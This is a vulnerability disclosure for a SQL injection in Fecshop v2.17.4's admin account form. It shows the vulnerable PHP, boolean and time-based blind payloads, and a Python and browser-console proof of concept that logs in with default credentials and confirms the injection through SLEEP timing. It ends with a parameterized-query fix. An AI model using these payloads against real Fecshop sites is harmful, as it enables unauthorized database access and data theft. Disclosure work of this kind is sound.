# [Vulnerability] Fecshop v2.17.4 — SQL Injection in /fecadmin/account/managereditsave

## Summary

The admin user creation/editing form at `/fecadmin/account/managereditsave` is vulnerable to SQL injection via the `username` and `code` POST parameters. The `validateUsername()` and `validateCode()` methods in `AdminUserForm.php` concatenate user input directly into SQL `WHERE` clauses without parameter binding, enabling both boolean-based and time-based blind extraction of database content.

## Vulnerability File

`models/mysqldb/adminUser/AdminUserForm.php:36-82`

## Vulnerable Code

```php
public function validateUsername($attribute, $params){
    if($this->id){
        // Existing user — both id AND username concatenated
        $one = AdminUser::find()->where(" id != ".$this->id." AND username = '".$this->username."' ")
            ->one();
    }else{
        // New user — username directly concatenated
        $one = AdminUser::find()->where(" username = '".$this->username."' ")
            ->one();
    }
}

public function validateCode($attribute, $params){
    if($this->id){
        $one = AdminUser::find()->where(" id != ".$this->id." AND code = '".$this->code."' ")
            ->one();
    }else{
        $one = AdminUser::find()->where(" code = '".$this->code."' ")    // SQLi
            ->one();
    }
}

// validateEmail() has identical pattern (lines 69-82) but is dead code —
// not registered in rules() array, so only username and code are exploitable
```

Three methods use the same vulnerable pattern, but `validateEmail()` is not registered in the validation rules and cannot be triggered.

## Impact

- **Boolean-based blind confirmed**: `username=admin' OR '1'='1` triggers "this username is exist!" validation error, confirming the injected condition was evaluated
- **Time-based blind confirmed**: `username=admin' AND SLEEP(5) AND '1'='1` causes 5.085s delay; `SLEEP(3)` causes 3.054s delay (exact correlation)
- **Data extraction possible**: Same technique as logtj endpoint, can dump `admin_user` table passwords, customer data, configuration
- **Two injection points**: `username` and `code` both independently vulnerable
- **CSRF protected** but bypassable with valid admin session token

## PoC

### Python Script (Full Verification)

```python
#!/usr/bin/env python3
import requests, re, time

BASE = "http://target"
s = requests.Session()

# Login
r = s.get(f"{BASE}/fecadmin/login/index")
csrf = re.search(r'value="([^"]+)" name="_csrf"', r.text).group(1)
s.post(f"{BASE}/fecadmin/login/index?lang=zh",
       data={"_csrf": csrf, "login[username]": "admin", "login[password]": "123456"})

# Get CSRF for user edit page
r = s.get(f"{BASE}/fecadmin/account/manageredit")
csrf2 = re.search(r'value="([^"]+)" name="_csrf"', r.text).group(1)

# === Test 1: Normal (baseline) ===
start = time.time()
r = s.post(f"{BASE}/fecadmin/account/managereditsave", data={
    "_csrf": csrf2, "editFormData[username]": "normaltest",
    "editFormData[code]": "x001", "editFormData[password]": "123456"
})
print(f"[1] Normal: {time.time()-start:.3f}s")

# === Test 2: Boolean-based blind (OR true) ===
start = time.time()
r = s.post(f"{BASE}/fecadmin/account/managereditsave", data={
    "_csrf": csrf2, "editFormData[username]": "admin' OR '1'='1",
    "editFormData[code]": "x002", "editFormData[password]": "123456"
})
print(f"[2] Boolean OR: {time.time()-start:.3f}s")
# -> "this username is exist!" — proves WHERE clause executed with injection

# === Test 3: Time-based SLEEP(5) ===
start = time.time()
r = s.post(f"{BASE}/fecadmin/account/managereditsave", data={
    "_csrf": csrf2, "editFormData[username]": "admin' AND SLEEP(5) AND '1'='1",
    "editFormData[code]": "x003", "editFormData[password]": "123456"
})
elapsed = time.time() - start
assert elapsed >= 4.5, f"SLEEP NOT triggered: {elapsed:.1f}s"
print(f"[3] SLEEP(5): {elapsed:.3f}s — CONFIRMED")

# === Test 4: Time-based SLEEP(3) ===
start = time.time()
r = s.post(f"{BASE}/fecadmin/account/managereditsave", data={
    "_csrf": csrf2, "editFormData[username]": "admin' AND SLEEP(3) AND '1'='1",
    "editFormData[code]": "x004", "editFormData[password]": "123456"
})
elapsed = time.time() - start
assert 2.5 <= elapsed <= 4.5, f"SLEEP(3) mismatch: {elapsed:.1f}s"
print(f"[4] SLEEP(3): {elapsed:.3f}s — CONFIRMED")
```

### Execution Results (test environment)

```
[1] Normal:     0.443s  -> {"statusCode":"300","message":["You must at least select one user role"]}
[2] Boolean OR: 0.081s  -> {"statusCode":"300","message":["this username is exist!"]}
[3] SLEEP(5):   5.085s  -> CONFIRMED
[4] SLEEP(3):   3.054s  -> CONFIRMED
```

### Browser Console Verification

```javascript
var csrf = document.querySelector('input[name="_csrf"]').value;

// Normal
console.time('n');
fetch('/fecadmin/account/managereditsave', {
  method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body: '_csrf='+csrf+'&editFormData[username]=test&editFormData[code]=x&editFormData[password]=123456'
}).then(r=>r.json()).then(d=>{console.timeEnd('n');console.log(d)});

// SLEEP(5) — confirmed with your browser session
console.time('s');
fetch('/fecadmin/account/managereditsave', {
  method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body: '_csrf='+csrf+"&editFormData[username]=admin' AND SLEEP(5) AND '1'='1&editFormData[code]=x&editFormData[password]=123456"
}).then(r=>r.json()).then(d=>{console.timeEnd('s');console.log(d)});
```

## Affected Versions

fecshop v2.17.4. The code pattern exists in `AdminUserForm.php` with no version-dependent changes.

## Fix

Replace raw string `where()` with Yii2 parameterized hash format:

```php
// Before (vulnerable):
$one = AdminUser::find()->where(" username = '".$this->username."' ")->one();

// After (secure):
$one = AdminUser::find()->where(['username' => $this->username])->one();
// For update case:
$one = AdminUser::find()->where(['username' => $this->username])
    ->andWhere(['!=', 'id', $this->id])->one();
```
